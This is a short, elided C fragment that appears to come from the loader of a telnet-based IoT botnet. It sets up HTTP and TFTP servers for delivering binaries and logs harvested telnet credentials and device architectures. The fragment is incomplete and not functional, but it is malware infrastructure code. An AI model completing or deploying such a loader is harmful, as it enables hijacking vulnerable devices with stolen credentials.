...
int main(int argc, char **args)
{
    ...
    if((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024, HTTP_SERVER, HTTP_PORT, TFTP_SERVER)) == NULL)
    {
    ...
    while(TRUE)
    {
        ...
        {
            printf("[DEBUG] Parsed telnet info - IP: %s, Port: %d, User: %s, Pass: %s, Arch: %s\n", 
                   inet_ntoa(*(struct in_addr*)&info.addr), ntohs(info.port), info.user, info.pass, info.arch);
            if(srv == NULL)
            {
